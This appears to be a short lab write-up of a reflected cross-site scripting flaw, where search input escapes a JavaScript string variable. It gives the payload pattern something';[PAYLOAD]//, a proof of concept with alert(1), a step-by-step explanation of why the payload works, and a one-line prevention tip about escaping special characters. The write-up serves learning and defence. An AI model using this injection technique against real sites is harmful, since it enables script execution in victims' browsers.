Vulnerability:
	The server does not sanitize the input,
	Allowing an attacker to break from the variable value feild and inject a JS code.
	
Exploit:
	Example:
		something';[PAYLOAD]//
	
	Exploit Script:
		something';alert(1)//
	
Explanation:
	- By injecting a string i can see that it is reflectedd in the searchTerms variable:
		var searchTerms = 'something';
	
	- So to be able to inject a payload ill add a singel quote and a semicolon at the beginning:	
		var searchTerms = '';[PAYLOAD]';
	
	- And to prevent it from causeing an error because what is left is a single open quote without a closing quote, i'll add two slashes (//) in the end of the input like so:
		var searchTerms = '';[PAYLOAD]//';
	
	- Then it will be seen to the page like so:
		<script>
			var searchTerms = '';
			[PAYLOAD]
			.
			.
		</script>
	
Prevention:
	- Escape special characters or do not allow them in the first place.
